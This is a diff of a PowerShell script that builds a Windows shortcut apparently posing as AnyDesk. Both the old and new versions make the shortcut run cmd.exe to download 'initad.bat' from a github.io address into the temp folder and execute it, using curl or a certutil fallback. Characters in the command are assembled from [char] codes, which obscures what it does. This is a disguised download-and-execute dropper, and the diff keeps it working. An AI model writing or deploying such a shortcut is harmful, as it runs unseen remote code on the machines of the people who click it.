@@ -52,17 +52,17 @@ try {
     Write-Warning "Can't create icon: $_"
 }
 
-$lnkUrl  = 'https://wevertonmbrtx.github.io/anydesk/initad.bat'
-$q       = [char]34
-$aa      = [char]38 + [char]38
-$oo      = [char]124 + [char]124
-$gt      = [char]62
-$tmp     = '%TEMP%\initad.bat'
-$cmdExe  = "$env:SystemRoot\System32\cmd.exe"
-$curlCmd = 'curl -s -o ' + $q + $tmp + $q + ' ' + $q + $lnkUrl + $q + ' ' + $aa + ' call ' + $q + $tmp + $q
-$certCmd = 'certutil -urlcache -split -f ' + $q + $lnkUrl + $q + ' ' + $q + $tmp + $q + ' ' + $aa + ' ' + $q + $tmp + $q
-$check   = 'where curl 1' + $gt + 'nul 2' + $gt + 'nul'
-$lnkArgs = '/c ' + $q + $check + ' ' + $aa + ' (' + $curlCmd + ') ' + $oo + ' (' + $certCmd + ')' + $q
+$url    = 'https://wevertonmbrtx.github.io/anydesk/initad.bat'
+$q      = [char]34
+$aa     = [char]38 + [char]38
+$cmdExe = "$env:SystemRoot\System32\cmd.exe"
+$tmp    = $env:TEMP + '\initad.bat'
+
+if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
+    $lnkArgs = '/c ' + $q + 'curl -s -o ' + $q + $tmp + $q + ' ' + $q + $url + $q + ' ' + $aa + ' call ' + $q + $tmp + $q + $q
+} else {
+    $lnkArgs = '/c ' + $q + 'certutil -urlcache -split -f ' + $q + $url + $q + ' ' + $q + $tmp + $q + ' ' + $aa + ' ' + $q + $tmp + $q + $q
+}
 
 try {
     $ws       = New-Object -ComObject WScript.Shell
